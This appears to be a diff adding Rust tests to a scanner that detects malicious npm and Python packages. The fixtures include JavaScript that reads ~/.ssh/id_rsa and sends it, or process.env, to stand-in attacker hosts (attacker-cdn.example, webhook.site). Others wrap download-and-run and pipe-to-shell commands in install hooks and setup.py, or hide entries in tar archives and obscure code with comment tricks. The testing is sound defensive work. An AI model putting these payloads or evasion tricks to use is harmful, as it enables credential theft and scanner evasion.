+    blob.extend_from_slice(evil.as_bytes());
+    blob.resize(1024, 0);
+
+    let mut builder = tar::Builder::new(Vec::new());
+    for (path, data) in [
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", b"require('./evil.js');\n"),
+    ] {
+        let mut h = tar::Header::new_ustar();
+        h.set_size(data.len() as u64);
+        h.set_mode(0o644);
+        h.set_cksum();
+        builder.append_data(&mut h, path, data).unwrap();
+    }
+    let record = b"10 size=0\n";
+    let mut px = tar::Header::new_ustar();
+    px.set_path("PaxHeaders.0/blob").unwrap();
+    px.set_entry_type(tar::EntryType::XHeader);
+    px.set_size(record.len() as u64);
+    px.set_cksum();
+    builder.append(&px, &record[..]).unwrap();
+    let mut h = tar::Header::new_ustar();
+    h.set_path("package/blob.bin").unwrap();
+    h.set_size(1024);
+    h.set_mode(0o644);
+    h.set_cksum();
+    builder.append(&h, &blob[..]).unwrap();
+    let bytes = builder.into_inner().unwrap();
+    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+    encoder.write_all(&bytes).unwrap();
+    encoder.finish().unwrap()
+}
+
+#[test]
+fn a_pax_size_that_differs_from_the_header_is_refused() {
+    let dir = TempDir::new().unwrap();
+    let path = write(dir.path(), "pax.tgz", &pax_size_desync());
+    let error = analyze_npm_package(&path).unwrap_err().to_string();
+    assert!(error.contains("PAX size"), "{error}");
+    let error = analyze_python_package(&path).unwrap_err().to_string();
+    assert!(error.contains("PAX size"), "{error}");
+}
+
+#[test]
+fn setup_py_lists_with_comments_keep_their_pins() {
+    let layouts = [
+        "from setuptools import setup\nREQUIRES = [\n  \"requests==2.5.0\",  # pinned for py2\n  \"PyYAML==5.3\",\n]\nsetup(name='c1', version='1.0', install_requires=REQUIRES)\n",
+        "from setuptools import setup\nREQUIRES = [\n  \"requests==2.5.0\",\n  # a comment line\n  \"PyYAML==5.3\",\n]\nsetup(name='c2', version='1.0', install_requires=REQUIRES)\n",
+        "from setuptools import setup\nsetup(name='c3', version='1.0', install_requires=[\n  \"requests==2.5.0\",  # trailing\n  # before the second\n  \"PyYAML==5.3\",\n])\n",
+    ];
+    for text in layouts {
+        let dir = TempDir::new().unwrap();
+        write(dir.path(), "setup.py", text.as_bytes());
+        let analysis = analyze_python_package(dir.path()).unwrap();
+        let deps = &analysis.dependencies.install_requires;
+        assert_eq!(deps.len(), 2, "{text}\n{deps:?}");
+        assert!(!deps["requests"].vulnerabilities.is_empty(), "{text}");
+        assert!(!deps["PyYAML"].vulnerabilities.is_empty(), "{text}");
+    }
+}
+
+#[test]
+fn setup_py_values_computed_at_run_time_are_noted() {
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "setup.py",
+        b"from setuptools import setup\nsetup_args = dict(name='k')\nsetup(**setup_args)\n",
+    );
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    let notes = analysis.input.notes.join("\n");
+    assert!(
+        notes.contains("**kwargs") && notes.contains("run time"),
+        "{notes}"
+    );
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "setup.py",
+        b"from setuptools import setup\nsetup(name='k', version='1', install_requires=read_reqs())\n",
+    );
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    let notes = analysis.input.notes.join("\n");
+    assert!(notes.contains("install_requires"), "{notes}");
+}
+
+#[test]
+fn payloads_that_only_trip_high_rules_rate_high() {
+    let dl = format!("require('child_process').exec('{}');\n", dl_run_line());
+    let steal = "const k = require('fs').readFileSync(require('os').homedir() + '/.ssh/id_rsa');\nrequire('https').request('https://collect.attacker-cdn.example/x').end(k);\n";
+    let hook = manifest_with_scripts(&json!({"postinstall": "node index.js"}));
+    for (name, entries) in [
+        (
+            "download-run in main",
+            vec![
+                ("package/package.json", PKG.as_bytes()),
+                ("package/index.js", dl.as_bytes()),
+            ],
+        ),
+        (
+            "key stealer run by postinstall",
+            vec![
+                ("package/package.json", &hook[..]),
+                ("package/index.js", steal.as_bytes()),
+            ],
+        ),
+    ] {
+        let (level, score, _) = npm_level(&entries);
+        assert!(
+            matches!(level, NpmRisk::High | NpmRisk::Critical),
+            "{name}: {level:?} {score}"
+        );
+    }
+    let dir = TempDir::new().unwrap();
+    write(
+        dir.path(),
+        "setup.py",
+        b"from setuptools import setup\nsetup(name='pyinit', version='1.0')\n",
+    );
+    write(
+        dir.path(),
+        "pyinit/__init__.py",
+        format!("import os\nos.system('{}')\n", dl_run_line()).as_bytes(),
+    );
+    let (level, score) = py_level(dir.path());
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?} {score}"
+    );
+}
+
+#[test]
+fn a_multibyte_unterminated_setup_py_expression_does_not_panic() {
+    let dir = TempDir::new().unwrap();
+    let text = format!(
+        "X = (a{}\nfrom setuptools import setup\nsetup(name='mb', version='1.0')\n",
+        "\u{e9}".repeat(200_000)
+    );
+    write(dir.path(), "setup.py", text.as_bytes());
+    let _ = analyze_python_package(dir.path());
+    let text = format!("X = (a{}\n", "\u{20ac}".repeat(100_000));
+    write(dir.path(), "setup.py", text.as_bytes());
+    let _ = analyze_python_package(dir.path());
+}
+
+#[test]
+fn a_package_that_was_not_fully_read_is_not_safe() {
+    let mut big = "var a=1;\n".repeat(130_000);
+    big.push_str(&format!(
+        "require('child_process').exec('{}');\n",
+        pipe_line()
+    ));
+    let (level, score, _) = npm_level(&[
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", big.as_bytes()),
+    ]);
+    assert!(!matches!(level, NpmRisk::Safe), "{level:?} {score}");
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "p.tgz",
+        &tgz(&[
+            ("package/package.json", PKG.as_bytes()),
+            ("package/index.js", big.as_bytes()),
+        ]),
+    );
+    let analysis = analyze_npm_package(&path).unwrap();
+    assert!(analysis
+        .malicious_indicators
+        .risk_reasons
+        .iter()
+        .any(|r| r.contains("not fully read")));
+}
+
+#[test]
+fn credentials_in_direct_reference_requirements_are_not_echoed() {
+    let dir = TempDir::new().unwrap();
+    let path = write(
+        dir.path(),
+        "requirements.txt",
+        b"git+https://tok3nvalue@example.invalid/x.git#egg=foo\nhttps://bob:pw12345@example.invalid/dl/pkg-1.0.tar.gz\nflask==1.0\n",
+    );
+    let analysis = analyze_python_package(&path).unwrap();
+    for key in analysis.dependencies.install_requires.keys() {
+        assert!(
+            !key.contains("tok3nvalue") && !key.contains("pw12345"),
+            "{key}"
+        );
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Round 4: comment tricks, tar entries without data, paging under a byte budget
+// ---------------------------------------------------------------------------
+
+const STEAL: &str = "const k = require('fs').readFileSync(homedir + '/.ssh/id_rsa');\nfetch('https://webhook.site/abc', {body: JSON.stringify(process.env)});\n";
+
+#[test]
+fn a_continued_string_or_a_regex_does_not_hide_high_rules() {
+    let prefixes = [
+        "var s = \"\\\n/*\";\n",
+        "if (1) /[/*]/.test('');\n",
+        "function f(){ return /[/*]/ }\n",
+        "var a = 1; a++ / 1; var s = '/'; var t = \"'/*\";\n",
+    ];
+    for prefix in prefixes {
+        let src = format!("{prefix}{STEAL}");
+        let (level, score, findings) = npm_level(&[
+            ("package/package.json", PKG.as_bytes()),
+            ("package/index.js", src.as_bytes()),
+        ]);
+        assert!(
+            matches!(level, NpmRisk::High | NpmRisk::Critical),
+            "{prefix:?}: {level:?} {score}"
+        );
+        assert!(findings >= 1);
+    }
+    // The same line after a backslash-continued string in Python and in shell.
+    let dir = TempDir::new().unwrap();
+    let setup = format!(
+        "from setuptools import setup\nimport os\nx = \"\\\n#\"; os.system('{}')\nsetup(name='bs', version='1.0')\n",
+        dl_run_line()
+    );
+    write(dir.path(), "setup.py", setup.as_bytes());
+    let (level, score) = py_level(dir.path());
+    assert!(
+        matches!(level, PyRisk::High | PyRisk::Critical),
+        "{level:?} {score}"
+    );
+    let manifest = manifest_with_scripts(&json!({"postinstall": "sh install.sh"}));
+    let script = format!("x=a\\\n#b; {}\n", dl_run_line());
+    let (level, score, _) = npm_level(&[
+        ("package/package.json", &manifest),
+        ("package/install.sh", script.as_bytes()),
+    ]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?} {score}"
+    );
+}
+
+#[test]
+fn a_critical_pipe_to_shell_in_the_main_module_is_at_least_high() {
+    let src = format!("require('child_process').exec('{}');\n", pipe_line());
+    let (level, score, _) = npm_level(&[
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", src.as_bytes()),
+    ]);
+    assert!(
+        matches!(level, NpmRisk::High | NpmRisk::Critical),
+        "{level:?} {score}"
+    );
+}
+
+fn ustar(path: &str, kind: tar::EntryType, size: u64) -> tar::Header {
+    let mut h = tar::Header::new_ustar();
+    h.set_path(path).unwrap();
+    h.set_entry_type(kind);
+    h.set_size(size);
+    h.set_mode(0o644);
+    h.set_cksum();
+    h
+}
+
+/// The header and data of `package/evil.js` (or any name), padded to 1024 bytes.
+fn hidden_entry(name: &str, body: &str) -> Vec<u8> {
+    let mut blob = ustar(name, tar::EntryType::Regular, body.len() as u64)
+        .as_bytes()
+        .to_vec();
+    blob.extend_from_slice(body.as_bytes());
+    blob.resize(1024, 0);
+    blob
+}
+
+fn gz(bytes: &[u8]) -> Vec<u8> {
+    let mut encoder = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::fast());
+    encoder.write_all(bytes).unwrap();
+    encoder.finish().unwrap()
+}
+
+/// package.json, index.js, then `extra` entries (header, data) as written.
+fn tar_with(files: &[(&str, &[u8])], extra: &[(tar::Header, Vec<u8>)]) -> Vec<u8> {
+    let mut builder = tar::Builder::new(Vec::new());
+    for (path, data) in files {
+        let h = ustar(path, tar::EntryType::Regular, data.len() as u64);
+        builder.append(&h, *data).unwrap();
+    }
+    for (h, data) in extra {
+        builder.append(h, &data[..]).unwrap();
+    }
+    gz(&builder.into_inner().unwrap())
+}
+
+#[test]
+fn entries_that_other_tar_readers_skip_or_extend_are_refused() {
+    let evil = format!("require('child_process').exec('{}');\n", pipe_line());
+    let blob = hidden_entry("package/evil.js", &evil);
+    let files: [(&str, &[u8]); 2] = [
+        ("package/package.json", PKG.as_bytes()),
+        ("package/index.js", b"require('./evil.js');\n"),
+    ];
+    let dir = TempDir::new().unwrap();
+    let mut cases: Vec<(&str, Vec<u8>)> = Vec::new();
+    for (name, path, kind) in [
+        ("dir", "package/d/", tar::EntryType::Directory),
+        ("sym", "package/s", tar::EntryType::Symlink),
+        ("slash", "package/f/", tar::EntryType::Regular),
+    ] {
+        cases.push((
+            name,
+            tar_with(&files, &[(ustar(path, kind, 1024), blob.clone())]),
+        ));
+    }
+    // Two PAX headers in a row: the first sets size=0, the second only a path.
+    let pax = |name: &str, record: &[u8]| {
+        let mut h = ustar(name, tar::EntryType::XHeader, record.len() as u64);
+        h.set_cksum();
+        (h, record.to_vec())
+    };
+    cases.push((
+        "pax2",
+        tar_with(
+            &files,
+            &[
+                pax("PaxHeaders.0/a", b"10 size=0\n"),
+                pax("PaxHeaders.0/b", b"26 path=package/blob.bin\n"),
+                (
+                    ustar("package/blob.bin", tar::EntryType::Regular, 1024),
+                    blob.clone(),
+                ),
+            ],
+        ),
+    ));
+    for (name, bytes) in &cases {
+        let path = write(dir.path(), &format!("{name}.tgz"), bytes);
+        let error = analyze_npm_package(&path).unwrap_err().to_string();
+        assert!(
+            error.contains("PAX size") || error.contains("declares 1024 bytes"),
+            "{name}: {error}"
+        );
+    }
+    // A Python sdist with a second setup.py behind a directory entry.
+    let hidden = blob_setup();
+    let sdist = tar_with(
+        &[(
+            "p-1.0/setup.py",
+            b"from setuptools import setup\nsetup(name='p', version='1.0')\n",
+        )],
+        &[(ustar("p-1.0/d/", tar::EntryType::Directory, 1024), hidden)],
+    );
+    let path = write(dir.path(), "p-1.0.tar.gz", &sdist);
+    let error = analyze_python_package(&path).unwrap_err().to_string();
+    assert!(error.contains("declares 1024 bytes"), "{error}");
+    // A plain directory entry with no data is still fine.
+    let ok = tar_with(
+        &files,
+        &[(ustar("package/d/", tar::EntryType::Directory, 0), vec![])],
+    );
+    let path = write(dir.path(), "ok.tgz", &ok);
+    assert!(analyze_npm_package(&path).is_ok());
+}
+
+fn blob_setup() -> Vec<u8> {
+    let body = format!("import os\nos.system('{}')\n", dl_run_line());
+    hidden_entry("p-1.0/setup.py", &body)
+}
+
+#[test]
+fn a_setup_py_too_big_to_parse_makes_the_package_not_fully_read() {
+    let mut setup = String::from("from setuptools import setup\n");
+    while setup.len() < 2 * 1024 * 1024 + 1024 {
+        setup.push_str("# pad pad pad pad pad pad pad pad pad pad pad pad\n");
+    }
+    setup.push_str(&format!("import os\nos.system('{}')\n", dl_run_line()));
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "setup.py", setup.as_bytes());
+    write(
+        dir.path(),
+        "PKG-INFO",
+        b"Metadata-Version: 2.1\nName: big\nVersion: 1.0\n",
+    );
+    let analysis = analyze_python_package(dir.path()).unwrap();
+    let reasons = analysis.malicious_indicators.risk_reasons.join(" ");
+    assert!(reasons.contains("not fully read"), "{reasons}");
+    assert!(!matches!(
+        analysis.malicious_indicators.risk_level,
+        PyRisk::Safe
+    ));
+}
+
+#[tokio::test]
+async fn paging_under_a_byte_budget_loses_no_rows() {
+    let dir = TempDir::new().unwrap();
+    write(dir.path(), "package.json", PKG.as_bytes());
+    for n in 0..60 {
+        write(dir.path(), &format!("f{n}.js"), evil_js().as_bytes());
+    }
+    let client = client().await;
+    for tool in ["analyze_npm_package"] {
+        let mut offset = 0u64;
+        let mut seen = 0usize;
+        let mut total: Option<u64>;
+        let mut pages = 0;
+        loop {
+            let (is_error, text) = call(
+                &client,
+                tool,
+                json!({"package_path": dir.path(), "section": "findings", "offset": offset,
+                       "limit": 500, "max_output_bytes": 4000}),
+            )
+            .await;
+            assert!(!is_error, "{text}");
+            let page: Value = serde_json::from_str(&text).unwrap();
+            let items = page["items"].as_array().unwrap().len();
+            assert_eq!(page["returned"], json!(items), "{page}");
+            total = Some(page["total"].as_u64().unwrap());
+            seen += items;
+            pages += 1;
+            assert!(pages < 200);
+            match page["next_offset"].as_u64() {
+                Some(next) => {
+                    assert_eq!(next as usize, offset as usize + items);
+                    offset = next;
+                }
+                None => break,
+            }
+        }
+        assert!(total.unwrap() > 60);
+        assert!(pages > 1);
+        assert_eq!(seen as u64, total.unwrap());
+    }
+}
